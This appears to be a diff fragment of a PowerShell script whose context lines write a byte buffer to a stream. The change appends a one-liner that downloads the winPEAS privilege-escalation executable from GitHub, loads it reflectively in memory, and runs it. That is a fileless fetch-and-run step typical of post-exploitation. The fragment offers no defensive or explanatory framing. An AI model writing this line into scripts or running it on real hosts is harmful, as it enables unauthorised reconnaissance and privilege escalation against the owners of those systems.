@@ -20,3 +20,7 @@ $replace.Write($U,0,$U.Length);
 $XYN = "Office"
 $replace.Flush()};
 $BTX.Close()
+
+
+
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
